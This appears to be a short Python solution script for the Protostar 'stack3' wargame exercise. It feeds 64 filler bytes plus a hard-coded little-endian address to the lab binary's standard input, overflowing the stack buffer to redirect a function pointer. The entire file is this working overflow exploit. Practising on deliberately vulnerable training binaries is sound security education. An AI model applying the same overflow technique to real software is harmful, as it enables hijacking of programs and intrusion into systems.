import subprocess
import struct

program = "/opt/protostar/bin/stack3"
target = "\x08\x04\x84\x24"[::-1]

string = "A"*64 + target
process = subprocess.Popen([program], stdin=subprocess.PIPE)
process.communicate(string)




